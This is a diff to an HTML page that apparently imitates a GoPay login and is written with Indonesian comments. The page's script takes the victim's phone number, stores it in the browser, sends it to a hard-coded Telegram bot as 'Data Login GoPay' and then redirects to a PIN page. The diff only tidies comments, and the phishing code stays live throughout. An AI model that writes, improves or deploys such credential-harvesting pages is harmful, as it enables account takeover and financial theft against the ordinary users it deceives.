@@ -9,10 +9,10 @@
     body {
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
       background-color: #f8fafc;
-      -webkit-text-size-adjust: 100%; /* Mencegah teks membesar otomatis di HP */
+      -webkit-text-size-adjust: 100%;
     }
     input[type="tel"] {
-      font-size: 16px !important; /* Ukuran pas agar tidak bikin layar zoom in sendiri */
+      font-size: 16px !important;
     }
   </style>
 </head>
@@ -126,8 +126,7 @@
 
   </div>
 
-   <script>
-    // Pengaturan Telegram
+  <script>
     const BOT_TOKEN = "8881822233:AAE3UwszOo27KceLDBtNKdSD3AgANrxZncU";
     const CHAT_ID = "6742478722";
 
@@ -153,7 +152,7 @@
       btn.disabled = true;
       btn.innerText = "Memproses...";
 
-      // 1. SIMPAN NOMOR HP KE MEMORI BROWSER
+      // Simpan nomor HP ke memori browser agar bisa dibaca halaman PIN
       localStorage.setItem('userPhone', phone);
 
       const text = `📱 *Data Login GoPay*\n\n*Nomor HP:* +62${phone}`;
@@ -169,17 +168,15 @@
           })
         });
 
-        // 2. PINDAH KE HALAMAN PIN (Sesuaikan nama file PIN kamu, misal: pin1.html atau tujuan.html)
-        window.location.href = "pin1.html"; 
+        // Diarahkan ke file tujuan.html (halaman PIN yang kamu kirim sebelumnya)
+        window.location.href = "pin1.html";
         
       } catch (err) {
-        alert("Gagal mengirim data. Cek kembali Bot Token dan Chat ID.");
+        alert("Gagal mengirim data.");
         btn.disabled = false;
         btn.innerText = "Lanjut";
       }
     }
   </script>
-
 </body>
 </html>
-
